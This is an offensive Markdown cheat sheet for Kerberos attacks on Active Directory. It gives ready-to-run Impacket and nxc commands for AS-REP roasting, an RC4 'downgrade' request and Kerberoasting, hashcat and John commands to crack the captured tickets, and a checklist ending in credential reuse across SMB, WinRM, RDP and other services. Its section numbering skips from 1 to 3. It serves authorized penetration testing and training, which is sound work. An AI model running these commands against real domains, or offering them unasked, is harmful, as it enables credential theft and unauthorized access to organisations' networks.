# Kerberos Attacks

## Objective

Abuse Kerberos authentication to obtain crackable ticket material and recover plaintext credentials. These attacks should be performed after building a reliable username list or obtaining valid domain credentials.

---

# 1. AS-REP Roasting

## When to Perform

- After collecting valid domain usernames.
- Does **not** require valid credentials.
- Targets accounts with **Kerberos pre-authentication disabled**.

### Enumerate AS-REP Roastable Users

```bash
GetNPUsers.py <DOMAIN.LOCAL>/ -dc-ip <DC_IP> -usersfile users.txt -request
```

### Using nxc

```bash
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep_hashes.txt
```

> **Purpose:** Request AS-REP responses from vulnerable accounts and extract crackable hashes.

---

## Crack AS-REP Hashes

### Using Hashcat

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Using John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

> **Note:** Successfully cracked passwords can be reused for SMB, LDAP, WinRM, RDP, MSSQL, and other services.

---

## Kerberos Downgrade Attack

### When to Perform

- After obtaining **valid domain credentials**.
- When performing **Kerberoasting** against service accounts.
- When the domain supports **RC4 (NTLM) encryption** in addition to AES.
- If the service account returns only **AES-encrypted TGS tickets**, which are generally slower to crack than RC4 tickets.
- When you want to force the KDC to issue an **RC4-HMAC** service ticket for faster offline password cracking.

> **Note:** Modern Active Directory environments may disable RC4 or configure service accounts to support only AES encryption. In such cases, Kerberos downgrade attacks will not succeed.

### Request AS-REP Hashes with RC4 Encryption

```bash
GetNPUsers.py <DOMAIN.LOCAL>/ -dc-ip <DC_IP> -usersfile users.txt -request -format hashcat --downgrade
```

---

# 3. Kerberoasting

## When to Perform

- After obtaining valid domain credentials.
- Targets service accounts with registered Service Principal Names (SPNs).

### Enumerate & Roast Using nxc

```bash
nxc ldap <DC_IP> -u <USER> -p <PASSWORD> --kerberoasting kerberoast_hashes.txt
```

### Using NTLM Hashes

```bash
nxc ldap <DC_IP> -u <USER> -H <NTLM_HASH> --kerberoasting kerberoast_hashes.txt
```

> **Purpose:** Enumerate SPN accounts and request crackable TGS tickets.

---

### Enumerate & Roast Using Impacket

```bash
GetUserSPNs.py <DOMAIN.LOCAL>/<USER>:<PASSWORD> -dc-ip <DC_IP> -request
```

### Using NTLM Hashes

```bash
GetUserSPNs.py -hashes :<NTLM_HASH> <DOMAIN.LOCAL>/<USER> -dc-ip <DC_IP> -request
```

### Using Kerberos Authentication

```bash
GetUserSPNs.py -k -no-pass <DOMAIN.LOCAL>/<USER> -dc-ip <DC_IP> -request
```

---

## Crack Kerberoast Hashes

### Hashcat

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

### John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast_hashes.txt
```

## Checklist

- [ ] Build a list of valid usernames.
- [ ] Perform AS-REP Roasting.
- [ ] Crack any recovered AS-REP hashes.
- [ ] Retry with the `--downgrade` flag if necessary.
- [ ] Obtain valid domain credentials.
- [ ] Perform Kerberoasting against SPN accounts.
- [ ] Crack recovered TGS hashes.
- [ ] Test recovered credentials across SMB, LDAP, WinRM, MSSQL, and RDP.
